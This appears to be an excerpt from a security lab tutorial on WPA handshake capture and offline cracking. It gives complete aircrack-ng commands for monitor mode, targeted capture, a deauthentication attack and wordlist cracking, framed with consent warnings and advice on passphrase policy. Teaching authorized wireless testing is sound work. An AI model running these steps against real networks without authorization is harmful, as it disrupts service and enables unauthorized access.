Preparation and capture (simulated)
sudo airmon-ng check kill
sudo airmon-ng start wlan0    # creates wlan0mon
sudo airodump-ng wlan0mon     # discover SSIDs and channels
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon  # if allowed by scope
aircrack-ng -w wordlist.txt capture-01.cap
These commands are shown as a lab demonstration only. Do not run against networks without written consent. Use monitor-capable hardware and verify your interface with iwconfig or airmon-ng.
Interpretation
  • airodump-ng identifies SSIDs and writes capture files.
  • Deauth can produce a handshake but is intrusive and must be allowed.
  • aircrack-ng performs offline cracking against captured handshakes with a wordlist.
Concrete example

In a lab, capture a handshake from a guest SSID, then run aircrack-ng with a reasonable wordlist. Record time-to-crack and recommend stronger passphrase policies if cracked quickly.

Common Mistake

Performing active deauth in production without rollback or approvals can cause outages and legal exposure.
